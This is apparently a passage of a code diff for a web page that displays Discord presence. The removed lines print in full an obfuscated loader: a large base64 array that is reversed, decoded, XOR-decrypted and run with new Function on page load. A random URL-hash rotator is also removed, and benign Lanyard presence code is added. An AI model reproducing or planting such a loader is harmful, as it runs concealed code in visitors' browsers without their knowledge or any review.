"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"];
-var _k=[76, 105, 118, 101, 67, 97, 114, 100, 88];
-var _s=37;
-var _a=_$.join('').split('').reverse().join('');
-var _b=atob(_a);
-var _c=new Uint8Array(_b.length);
-for(var i=0;i<_b.length;i++)_c[i]=_b.charCodeAt(i);
-var _d=new Uint8Array(_c.length);
-for(var i=0;i<_c.length;i++)_d[i]=(_c[i]^_k[i%_k.length]);
-var _e=new Uint8Array(_d.length);
-for(var i=0;i<_d.length;i++)_e[i]=(_d[i]-_s+256)%256;
-var _f=new TextDecoder('utf-8').decode(_e);
-(new Function(_f))();
-})();</script>
+function applyPresence(data) {
+  /* Avatar */
+  const user = data.discord_user;
+  if (user) {
+    const avatarHash = user.avatar;
+    const ext = avatarHash?.startsWith('a_') ? 'gif' : 'webp';
+    const avUrl = avatarHash
+      ? `https://cdn.discordapp.com/avatars/${user.id}/${avatarHash}.${ext}?size=128`
+      : `https://cdn.discordapp.com/embed/avatars/${(BigInt(user.id) >> 22n) % 6n}.png`;
+    const img = $('avImg');
+    img.src = avUrl;
+    img.alt = user.global_name || user.username;
 
-<!-- ═══ Perf: mark paint ═══ -->
-<script>if(window.performance&&performance.mark)performance.mark('app-end');</script>
+    /* Update favicon */
+    const fav = document.getElementById('favicon');
+    if (fav) {
+      fav.href = `https://cdn.discordapp.com/avatars/${user.id}/${avatarHash}.webp?size=32`;
+    }
 
-<!-- ═══ Random Hash Rotator ═══ -->
-<script>
-(function(){
-  var _c='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-';
-  function rnd(len){
-    var s='';
-    var arr=new Uint8Array(len);
-    crypto.getRandomValues(arr);
-    for(var i=0;i<len;i++)s+=_c[arr[i]%_c.length];
-    return s;
+    $('dName').textContent   = user.global_name || user.username;
+    $('uHandle').textContent = '@' + user.username;
+    $('dmBtn').href = `https://discord.com/users/${user.id}`;
   }
-  function rotate(){
-    // random length between 8-24 chars each tick
-    var arr=new Uint8Array(1);
-    crypto.getRandomValues(arr);
-    var len=8+(arr[0]%17);
-    history.replaceState(null,'','#'+rnd(len));
-    // next rotation: 800ms - 2500ms random interval
-    var arr2=new Uint8Array(2);
-    crypto.getRandomValues(arr2);
-    var delay=800+((arr2[0]<<8|arr2[1])%1700);
-    setTimeout(rotate,delay);
-  }
-  // start after 300ms so page renders first
-  setTimeout(rotate,300);
-})();
-</script>
 
+  setStatus(data.discord_status || 'offline');
+  setCustomStatus(data);
+  renderActivity(data);
+}
+
+/* ═══════════════════════════════════════════════
+   LANYARD — WebSocket with REST fallback
+   ═══════════════════════════════════════════════ */
+(function initLanyard() {
+  if (!DISCORD_USER_ID) {
+    console.warn('[Lanyard] Set DISCORD_USER_ID in the config section.');
+    $('sVal').textContent = 'Set User ID';
+    hideLoading();
+    return;
+  }
+
+  let ws, heartbeatInterval, dead = false;
+
+  function connect() {
+    dead = false;
+    ws = new WebSocket('wss://api.lanyard.rest/socket');
+
+    ws.addEventListener('open', () => {
+      /* Send identify */
+      ws.send(JSON.stringify({ op: 2, d: { subscribe_to_id: DISCORD_USER_ID } }));
+    });
+
+    ws.addEventListener('message', e => {
+      let msg;
+      try { msg = JSON.parse(e.data); } catch { return; }
+
+      switch (msg.op) {
+        /* Hello — start heartbeat */
+        case 1:
+          if (heartbeatInterval) clearInterval(heartbeatInterval);
+          heartbeatInterval = setInterval(() => {
+            if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ op: 3 }));
+          }, msg.d.heartbeat_interval);
+          break;
+
+        /* Dispatch — INIT_STATE or PRESENCE_UPDATE */
+        case 0:
+          if (msg.t === 'INIT_STATE' || msg.t === 'PRESENCE_UPDATE') {
+            applyPresence(msg.d);
+            hideLoading();
+          }
+          break;
+      }
+    });
+
+    ws.addEventListener('close', () => {
+      if (heartbeatInterval) clearInterval(heartbeatInterval);
+      if (!dead) setTimeout(connect, 3000);
+    });
+
+    ws.addEventListener('error', () => {
+      ws.close();
+      if (!dead) restFallback();
+    });
+  }
+
+  function restFallback() {
+    fetch(`https://api.lanyard.rest/v1/users/${DISCORD_USER_ID}`)
+      .then(r => r.json())
+      .then(d => { if (d.data) { applyPresence(d.data); hideLoading(); } })
+      .catch(() => {
+        $('sVal').textContent = 'Offline';
+        hideLoading();
+      });
+  }
+
+  connect();
+
+  /* Cleanup on unload */
+  window.addEventListener('beforeunload', () => {
+    dead = true;
+    if (ws) ws.close();
+    if (heartbeatInterval) clearInterval(heartbeatInterval);
+  });
+})();
+
+/* ═══════════════════════════════════════════════
+   LOADING HIDE
+   ═══════════════════════════════════════════════ */
+function hideLoading() {
+  const el = $('loading');
+  if (!el || el.classList.contains('fade')) return;
+  el.classList.add('fade');
+  setTimeout(() => { el.style.display = 'none'; }, 1100);
+}
+
+/* Fallback hide after 4s if Lanyard never responds */
+setTimeout(hideLoading, 4000);
